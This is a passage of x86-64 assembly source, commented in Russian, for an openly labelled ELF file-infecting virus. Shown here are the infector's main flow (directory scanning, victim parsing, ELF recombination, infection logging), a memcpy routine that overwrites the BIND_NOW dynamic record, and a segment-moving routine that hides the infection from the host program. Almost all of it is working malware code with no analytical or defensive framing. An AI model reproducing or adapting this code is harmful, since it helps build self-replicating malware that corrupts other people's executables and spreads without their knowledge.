_scip_dynamic:
    mov     dynamic_records_size(%rip), %rdx

    // сдвинуть указатели на конец
    // секции dynamic
    add     %rdx, %rdi
    add     %rdx, %rsi

    // сдвинуть dest так, чтоб
    // запись BIND_NOW, если она есть
    // была затерта
    mov     new_bind_now_flag_record_size(%rip), %rdx
    sub     %rdx, %rdi

    //  этот цикл начнется на той же итерации,
    //  на которой был _cycle_my_memcpy_before_dynamic
_cycle_my_memcpy_after_dynamic:
    movb    (%rsi), %dl
    movb    %dl, (%rdi)

    inc     %rsi
    inc     %rdi

    dec     %rcx
    test    %rcx, %rcx
    je      _my_memcpy_success
    jmp     _cycle_my_memcpy_after_dynamic

_my_memcpy_success:
    xor     %rax, %rax
    jmp     _my_memcpy_exit

_my_memcpy_fail:
    mov     $-1, %rax

_my_memcpy_exit:
    popq    %rsi
    popq    %rdi
    popq    %rdx
    popq    %rcx
    ret

/// _MOVE_SEGMENTS
/// Сдвигает жертву в памяти процесса таким
/// образом, как будто никакого заражения не
/// было
_move_segments:
    push    %rcx
    push    %rbx
    push    %rdx
    push    %rdi

    mov     victim_phdr_table_addr(%rip), %rdi
    test    %rdi, %rdi
    je     _move_segments_fail

    mov     victim_phdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je     _move_segments_fail

_move_segments_cycle:
    // загружаемвый сегмент?
    cmp     $0x1, (%rdi)
    jne     _move_segments_next

    // это первый загружаемый сегмент кода?
    mov     PHDR_P_OFFSET(%rdi), %rax
    test    %rax, %rax

    je      _move_first_segment

_move_segment:
    mov     %rdi, cur_seg_hdr_ptr(%rip)
    call    _get_segm_addr_and_sz
    test    %rax, %rax
    jne     _move_segments_fail

    call    _my_memcpy
    test    %rax, %rax
    jne     _move_segments_fail

_move_segments_next:
    add     $0x38, %rdi
    loop    _move_segments_cycle
    jmp     _move_segments_success

    // сдвигаем первый сегмент кода
    // он включает в себя заголовок эльфа и
    // таблицу заголовков сегментов, которые
    // сдвигать не надо - нам надо сдвинуть только
    // код жертвы, который начинается сразу после
    // таблицы заголовков
_move_first_segment:
    mov     %rdi, cur_seg_hdr_ptr(%rip)
    call    _get_segm_addr_and_sz
    test    %rax, %rax
    jne     _move_segments_fail

    mov     cur_seg_addr(%rip), %rax
    mov     cur_seg_memsz(%rip), %rbx

    mov     victim_code_offset(%rip), %rdx
    sub     %rdx, %rbx  # размер сдвигаемого сегмента
    mov     %rbx, cur_seg_memsz(%rip)
    add     %rdx, %rax
    mov     %rax, cur_seg_addr(%rip)

    call    _my_memcpy
    test    %rax, %rax
    jne     _move_segments_fail

    jmp     _move_segments_next

_move_segments_success:
    xor     %rax, %rax
    jmp     _move_segments_exit

_move_segments_fail:
    mov    $-1, %rax

_move_segments_exit:
    pop    %rdi
    pop    %rdx
    pop    %rbx
    pop    %rcx

    ret


/// _EXIT_VIRUS
/// Аварийный выход из вируса
_exit_virus:
    mov $0x3c, %rax
    mov $0x0,  %rdi
    syscall

/// _START_INFECTOR
/// старт инфектора
_start_infector:
    call    _allow_write_into_code

    jmp     _save_registers

_prepare_data:
    call    _clear_old_data
    // test    %rax, %rax
    // jne     _global_exit

    call    _my_readdir

_get_victim_name:
    call    _get_file_name
    call    _print_infection_log

    call    _parse_victim
    test    %rax, %rax
    jnz     _get_victim_name

    call    _get_virus_code

    call    _recount_victim
    test    %rax, %rax
    jne     _restore_registers_and_stack

    call    _open_interm_file
    test    %rax, %rax
    jne     _restore_registers_and_stack

    call    _recombine_elf
    test    %rax, %rax
    jne     _restore_registers_and_stack

    call    _print_success_infection_msg

/// Возвращает регистры в состояние
/// до исполнения вируса
_restore_registers_and_stack:
    mov     old_rsp(%rip), %rsp     # restore old %RSP
    mov     old_rbx(%rip), %rbx
    mov     old_rdx(%rip), %rdx
    mov     old_rcx(%rip), %rcx
    mov     old_rdi(%rip), %rdi
    mov     old_rsi(%rip), %rsi
    mov     old_r8(%rip), %r8
    mov     old_r9(%rip), %r9
    mov     old_r10(%rip), %r10
    mov     old_r11(%rip), %r11
    mov     old_r12(%rip), %r12
    mov     old_r13(%rip), %r13
    mov     old_r14(%rip), %r14
    mov     old_r15(%rip), %r15

/// выход из инфетора
_global_exit:
    mov $0x3c, %rax
    mov $0x0,  %rdi
    syscall

_fin_infector:
    nop
